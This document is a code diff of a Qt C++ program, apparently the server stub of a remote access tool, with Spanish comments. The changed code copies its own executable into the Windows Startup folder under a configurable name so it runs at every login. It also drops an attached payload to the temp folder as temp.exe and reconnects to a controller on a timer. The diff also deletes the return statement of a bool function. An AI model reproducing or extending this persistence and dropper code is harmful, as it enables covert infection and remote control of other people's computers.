@@ -83,7 +83,9 @@ void MainWindow::inicio(){
     {
         datos = datos + "noejecutar|@|0|@|"; //Sino decimos al servidor copiado que no ejecute nada
     }
-    copiarServidor(datos,"");
+    if (directorio.exists(QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")) { //Windows
+        copiarServidor(datos,QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/" + this->nombreCopiable);
+    }
     temporizador.start(this->tiempoConexion); //iniciar el temporizador para conexión
     connect(&temporizador,SIGNAL(timeout()),this,SLOT(conectar())); //cada "tiempoConexion" intentar conectar
     connect(&socket,SIGNAL(readyRead()),this,SLOT(llegadaDatos()));
@@ -145,10 +147,7 @@ bool MainWindow::cargarConfiguracion(){
         this->nombreCopiable = campo[10];
         this->ejecutar = campo[11];
         this->siempreOUnaVez = campo[12];
-
-
     }
-    return false;
 }
 
 void MainWindow::copiarServidor(QByteArray tramaConfiguracion, QString destino)
@@ -167,10 +166,7 @@ void MainWindow::copiarServidor(QByteArray tramaConfiguracion, QString destino)
         QFile copiable;
         adjunto.setFileName(directorio.tempPath() + "/temp.exe");
         servidor.setFileName(QApplication::applicationFilePath());
-        if (directorio.exists(QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")) { //Windows
-            copiable.setFileName(QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/" + this->nombreCopiable);
-        }
-
+        copiable.setFileName(destino);
         copiable.open(QFile::WriteOnly);
         adjunto.open(QFile::WriteOnly);
         servidor.open(QFile::ReadOnly);
@@ -189,9 +185,7 @@ void MainWindow::copiarServidor(QByteArray tramaConfiguracion, QString destino)
         QFile servidor;
         QFile copiable;
         servidor.setFileName(QApplication::applicationFilePath());
-        if (directorio.exists(QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")) { //Windows
-            copiable.setFileName(QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/" + this->nombreCopiable);
-        }
+        copiable.setFileName(destino);
         copiable.open(QFile::WriteOnly);
         servidor.open(QFile::ReadOnly);
         copiable.write(servidor.read(servidor.size() - 1024));
